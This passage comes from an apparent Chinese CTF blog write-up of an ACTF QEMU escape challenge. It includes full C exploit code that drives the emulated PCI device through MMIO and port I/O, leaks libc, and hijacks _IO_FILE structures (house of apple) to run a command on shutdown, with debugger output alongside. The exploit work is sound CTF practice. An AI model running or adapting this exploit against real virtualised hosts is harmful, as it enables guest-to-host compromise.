addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    outb(value,PMIO_BASE+addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_value</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    mmio_write(addr,value&amp;<span class="hljs-number">0xffffffff</span>);<br>    mmio_write(addr+<span class="hljs-number">4</span>,value&gt;&gt;<span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_SYNC|O_RDWR);<br>    <span class="hljs-keyword">if</span> (mmio_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open mmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;get mmio_mem failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);<br><br>    <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open pmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">// 00:0000│ rbx 0x56043c8e1fa8 ◂— 0xaba29ec2a98dd89a                                                     </span><br><span class="hljs-comment">// 01:0008│     0x56043c8e1fb0 ◂— 0xbbf1b4ab81b4a9d4                                                     </span><br><span class="hljs-comment">// 02:0010│     0x56043c8e1fb8 ◂— 0xfb92a48db386ffa8                                                     </span><br><span class="hljs-comment">// 03:0018│     0x56043c8e1fc0 ◂— 0xefb491b8afb4abd3                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x56043c8e1fc8 ◂— 0x80ef69f1cbd00397                                                    </span><br><span class="hljs-comment">// 05:0028│     0x56043c8e1fd0 ◂— 0xb2eb07859cda52d3                                                     </span><br><span class="hljs-comment">// 06:0030│     0x56043c8e1fd8 ◂— 0xec9e22f5a5a07fa3                                                 </span><br><span class="hljs-comment">// 07:0038│     0x56043c8e1fe0 ◂— 0x4b36df7b5b655a84 </span><br><br><span class="hljs-comment">// 00:0000│ rbx 0x559cbeef0fa8 ◂— 0x7a1299023d29ff68                                                     </span><br><span class="hljs-comment">// 01:0008│     0x559cbeef0fb0 ◂— 0x702edf5e423bb634                                                     </span><br><span class="hljs-comment">// 02:0010│     0x559cbeef0fb8 ◂— 0x2653e2366369b36c                                                     </span><br><span class="hljs-comment">// 03:0018│     0x559cbeef0fc0 ◂— 0xd9a33790b594ae73                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x559cbeef0fc8 ◂— 0xc9b59388b0adbfbe                                                     </span><br><span class="hljs-comment">// 05:0028│     0x559cbeef0fd0 ◂— 0x8bb287b5efbeaf84                                                     </span><br><span class="hljs-comment">// 06:0030│     0x559cbeef0fd8 ◂— 0x95b4a2838496a4f8                                                    </span><br><span class="hljs-comment">// 07:0038│     0x559cbeef0fe0 ◂— 0xc6ca9ad88681c5b4     </span><br><br><span class="hljs-comment">// 0x7f0f875f94a0 ◂— 0x3525b76e0d25b76e</span><br><span class="hljs-comment">// 0x7f0f875f94a8 ◂— 0xb5a5278efde5674e</span><br><span class="hljs-comment">// 0x7f0f875f94b0 ◂— 0xb58517cead8517ce</span><br><span class="hljs-comment">// 0x7f0f875f94b8 ◂— 0x3505e72e7d4527ee</span><br><br><span class="hljs-comment">// something_i_know ^ x = flag 0x559cbeef0570</span><br><br>    set_value(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x7a1299023d29ff68</span>);<br>    set_value(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x702edf5e423bb634</span>);<br>    set_value(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2653e2366369b36c</span>);<br>    set_value(<span class="hljs-number">0x18</span>,<span class="hljs-number">0xd9a33790b594ae73</span>);<br>    set_value(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xc9b59388b0adbfbe</span>);<br>    set_value(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x8bb287b5efbeaf84</span>);<br>    set_value(<span class="hljs-number">0x30</span>,<span class="hljs-number">0x95b4a2838496a4f8</span>);<br>    set_value(<span class="hljs-number">0x38</span>,<span class="hljs-number">0xc6ca9ad88681c5b4</span>);<br>    <br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>后来👴看了arr的wp，知道了这边才是核心(👴是不会说👴刚开始把后面的赋值当成核心在看的（bushi））</p><p><img src="/img/ACTF/9.png" alt="img"></p><p>👴动调了一会发现大概应该或许可能是一个有点麻烦的异或，反正👴出flag了不管了</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>👴一直搞不明白那个0xa31的地方是怎么变成1的</p><p>看了xtx师傅的wp发现pmio_write两次就行了，啊？</p><p>逆不明白，尊嘟逆不明白</p><p>后面就是mmio_write可以覆写0xa78低4位，造成任意地址读写</p><p>然后libc泄露因为只有低4位可改，找了半天也找不到，看了Esifiel师傅的官方wp才知道原来pandbg还有这个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">pwndbg&gt; leakfind <span class="hljs-number">0x7fff60000000</span> --max_offset=<span class="hljs-number">0x1000</span> --page_name=libc<br>        <span class="hljs-number">0x7fff60000000</span>+<span class="hljs-number">0x8a0</span> —▸ <span class="hljs-number">0x7ffff0000030</span>+<span class="hljs-number">0x870</span> —▸ <span class="hljs-number">0x7ffff6819c80</span> /usr/lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span><br></code></pre></td></tr></table></figure><p>啊？啊？啊？</p><p>🤡</p><p>后面就是打_IO_FILE，在关机的时候把flag带出来，我这里用的是最顺手的house of apple链子</p><p>然后因为只有低四字节能覆盖，泄露libc大概有1&#x2F;2的概率offset超出四字节限制，回直接dump掉，调式的时候真给👴干🤮🌶️。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-comment">// #define PAGE_SHIFT 12</span><br><span class="hljs-comment">// #define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) // 4096</span><br><span class="hljs-comment">// #define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-comment">// #define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-comment">// #define PMIO_BASE 0x000000000000c000</span><br><span class="hljs-comment">// #define CSR(_x) ((_x) &lt;&lt; 3)</span><br><span class="hljs-comment">// #define CSR5_TS_SUSPENDED 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMIO_BASE 0XC040</span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* mmio_mem;<br><span class="hljs-type">uint8_t</span> payload[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint32_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> inl(PMIO_BASE + value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    outb(value,PMIO_BASE+addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_value</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    mmio_write(addr,value&amp;<span class="hljs-number">0xffffffff</span>);<br>    mmio_write(addr+<span class="hljs-number">4</span>,value&gt;&gt;<span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_payload</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> start_addr, <span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size / <span class="hljs-number">8</span>; ++i)&#123;<br>        mmio_write(<span class="hljs-number">0x40</span>, start_addr);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; ++j)&#123;<br>            pmio_write(j + <span class="hljs-number">0x10</span>, payload[i * <span class="hljs-number">8</span> + j]);<br>        &#125;<br>        start_addr += <span class="hljs-number">8</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> leak[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_SYNC|O_RDWR);<br>    <span class="hljs-keyword">if</span> (mmio_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open mmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;get mmio_mem failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);<br><br>    <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open pmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">// 00:0000│ rbx 0x56043c8e1fa8 ◂— 0xaba29ec2a98dd89a                                                     </span><br><span class="hljs-comment">// 01:0008│     0x56043c8e1fb0 ◂— 0xbbf1b4ab81b4a9d4                                                     </span><br><span class="hljs-comment">// 02:0010│     0x56043c8e1fb8 ◂— 0xfb92a48db386ffa8                                                     </span><br><span class="hljs-comment">// 03:0018│     0x56043c8e1fc0 ◂— 0xefb491b8afb4abd3                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x56043c8e1fc8 ◂— 0x80ef69f1cbd00397                                                    </span><br><span class="hljs-comment">// 05:0028│     0x56043c8e1fd0 ◂— 0xb2eb07859cda52d3                                                     </span><br><span class="hljs-comment">// 06:0030│     0x56043c8e1fd8 ◂— 0xec9e22f5a5a07fa3                                                 </span><br><span class="hljs-comment">// 07:0038│     0x56043c8e1fe0 ◂— 0x4b36df7b5b655a84 </span><br><br><span class="hljs-comment">// 00:0000│ rbx 0x559cbeef0fa8 ◂— 0x7a1299023d29ff68                                                     </span><br><span class="hljs-comment">// 01:0008│     0x559cbeef0fb0 ◂— 0x702edf5e423bb634                                                     </span><br><span class="hljs-comment">// 02:0010│     0x559cbeef0fb8 ◂— 0x2653e2366369b36c                                                     </span><br><span class="hljs-comment">// 03:0018│     0x559cbeef0fc0 ◂— 0xd9a33790b594ae73                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x559cbeef0fc8 ◂— 0xc9b59388b0adbfbe                                                     </span><br><span class="hljs-comment">// 05:0028│     0x559cbeef0fd0 ◂— 0x8bb287b5efbeaf84                                                     </span><br><span class="hljs-comment">// 06:0030│     0x559cbeef0fd8 ◂— 0x95b4a2838496a4f8                                                    </span><br><span class="hljs-comment">// 07:0038│     0x559cbeef0fe0 ◂— 0xc6ca9ad88681c5b4     </span><br><br><span class="hljs-comment">// 0x7f0f875f94a0 ◂— 0x3525b76e0d25b76e</span><br><span class="hljs-comment">// 0x7f0f875f94a8 ◂— 0xb5a5278efde5674e</span><br><span class="hljs-comment">// 0x7f0f875f94b0 ◂— 0xb58517cead8517ce</span><br><span class="hljs-comment">// 0x7f0f875f94b8 ◂— 0x3505e72e7d4527ee</span><br><br><span class="hljs-comment">// something_i_know ^ x = flag 0x559cbeef0570</span><br><br>    set_value(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x7a1299023d29ff68</span>);<br>    set_value(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x702edf5e423bb634</span>);<br>    set_value(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2653e2366369b36c</span>);<br>    set_value(<span class="hljs-number">0x18</span>,<span class="hljs-number">0xd9a33790b594ae73</span>);<br>    set_value(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xc9b59388b0adbfbe</span>);<br>    set_value(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x8bb287b5efbeaf84</span>);<br>    set_value(<span class="hljs-number">0x30</span>,<span class="hljs-number">0x95b4a2838496a4f8</span>);<br>    set_value(<span class="hljs-number">0x38</span>,<span class="hljs-number">0xc6ca9ad88681c5b4</span>);<br>    <br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    pmio_write(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    pmio_write(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    leak[<span class="hljs-number">0</span>] = mmio_read(<span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">uint32_t</span> addr1 = <span class="hljs-number">0</span>;<br>    addr1 = (leak[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">24</span>) &lt;&lt; <span class="hljs-number">24</span>;<br><br>    mmio_write(<span class="hljs-number">0x40</span>,addr1 + <span class="hljs-number">0x8a0</span>);<br>    leak[<span class="hljs-number">0</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x10</span>);<br>    leak[<span class="hljs-number">1</span>] = pmio_read(<span class="hljs-number">4</span>+<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-type">uint64_t</span> addr2 = <span class="hljs-number">0</span>;<br>    addr2 = leak[<span class="hljs-number">1</span>] * <span class="hljs-number">0x100000000</span> + leak[<span class="hljs-number">0</span>];<br>    sleep(<span class="hljs-number">1</span>);<br>    mmio_write(<span class="hljs-number">0x40</span>,leak[<span class="hljs-number">0</span>]+<span class="hljs-number">0x8a0</span><span class="hljs-number">-0x30</span>);<br><br>    leak[<span class="hljs-number">0</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x10</span>);<br>    leak[<span class="hljs-number">1</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x14</span>);<br>    <br>    <span class="hljs-type">size_t</span> libc_address = <span class="hljs-number">0</span>;<br>    libc_address = (leak[<span class="hljs-number">1</span>]*<span class="hljs-number">0x100000000</span>) + leak[<span class="hljs-number">0</span>] - <span class="hljs-number">0x219c80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc_address is %lx&quot;</span>,libc_address);<br><br>    <span class="hljs-type">size_t</span> system_addr = <span class="hljs-number">0x50d70</span> + libc_address;<br>    <span class="hljs-type">size_t</span> stderr_addr = <span class="hljs-number">0x21a6a0</span> + libc_address;<br>    <span class="hljs-type">size_t</span> _IO_list_all = <span class="hljs-number">0x21a680</span> + libc_address;<br>    <span class="hljs-type">size_t</span> _IO_wfile_jumps = <span class="hljs-number">0x2160c0</span> + libc_address;<br><br>    <span class="hljs-built_in">memcpy</span>(payload, <span class="hljs-string">&quot;  cat flag &gt;&amp;2;&quot;</span>, <span class="hljs-number">0x10</span>);<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">5</span>] = <span class="hljs-number">1</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">20</span>] = addr2;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">27</span>] = _IO_wfile_jumps;<br>    send_payload(stderr_addr, <span class="hljs-number">0xe0</span>);<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">20</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">27</span>] = <span class="hljs-number">0</span>;<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = stderr_addr;<br>    send_payload(stderr_addr - <span class="hljs-number">0x20</span>, <span class="hljs-number">0x8</span>);<br>    <br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = addr2+<span class="hljs-number">0xe0</span>;<br>    send_payload(addr2+<span class="hljs-number">0xe0</span>, <span class="hljs-number">0x8</span>);<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = system_addr;<br>    send_payload(addr2+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x68</span>,<span class="hljs-number">8</span>);<br><br><br>    system(<span class="hljs-string">&quot;poweroff -f&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/10.png" alt="img"></p><p>终于出来啦，感觉比🐍出来还要舒服啊</p><p>其实感觉挺基础的一道qemu escape，但为什么要加个逆向来恶心我呢。</p><p>这是怎么绘事呢？</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dig into C++ pwn</title>
    <link href="/2023/10/20/C/"/>
    <url>/2023/10/20/C/</url>
    
